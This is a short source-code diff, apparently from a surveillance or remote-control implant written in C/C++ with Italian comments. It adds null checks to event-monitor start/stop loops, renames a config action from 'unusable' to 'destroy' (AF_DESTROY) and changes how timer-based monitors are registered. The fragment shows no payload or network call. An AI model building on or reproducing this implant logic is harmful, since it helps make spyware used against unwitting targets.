@@ -133,14 +133,16 @@ void EventMonitorStartAll()
 {
 	DWORD i;
 	for (i=0; i<event_monitor_count; i++)
-		event_monitor_array[i].pEventMonitorStart();
+		if (event_monitor_array[i].pEventMonitorStart)
+			event_monitor_array[i].pEventMonitorStart();
 }
 
 void EventMonitorStopAll()
 {
 	DWORD i;
 	for (i=0; i<event_monitor_count; i++)
-		event_monitor_array[i].pEventMonitorStop();
+		if (event_monitor_array[i].pEventMonitorStop)
+			event_monitor_array[i].pEventMonitorStop();
 }
 
 void EventTableInit()
@@ -497,7 +499,7 @@ BYTE *ParseActionParameter(JSONObject conf_json, DWORD *tag)
 			DWORD event_id = conf_json[L"event"]->AsNumber();
 			memcpy(param, &event_id, sizeof(DWORD));
 		}
-	} else if (!wcscmp(action, L"unusable")) {
+	} else if (!wcscmp(action, L"destroy")) {
 		*tag = AF_DESTROY;
 		param = (BYTE *)malloc(sizeof(BOOL));
 		if (param) {
@@ -634,8 +636,8 @@ void SM_MonitorEvents(DWORD dummy)
 
 	// Registrazione degli EM e delle AF. 
 	EventMonitorRegister(L"timer", EM_TimerAdd, EM_TimerStart, EM_TimerStop);
-	EventMonitorRegister(L"afterinst", EM_TimerAdd, EM_TimerStart, EM_TimerStop);
-	EventMonitorRegister(L"date", EM_TimerAdd, EM_TimerStart, EM_TimerStop);
+	EventMonitorRegister(L"afterinst", EM_TimerAdd, NULL, NULL);
+	EventMonitorRegister(L"date", EM_TimerAdd, NULL, NULL);
 	EventMonitorRegister(L"process", EM_MonProcAdd, EM_MonProcStart, EM_MonProcStop);
 	EventMonitorRegister(L"connection", EM_MonConnAdd, EM_MonConnStart, EM_MonConnStop);
 	EventMonitorRegister(L"screensaver", EM_ScreenSaverAdd, EM_ScreenSaverStart, EM_ScreenSaverStop);	
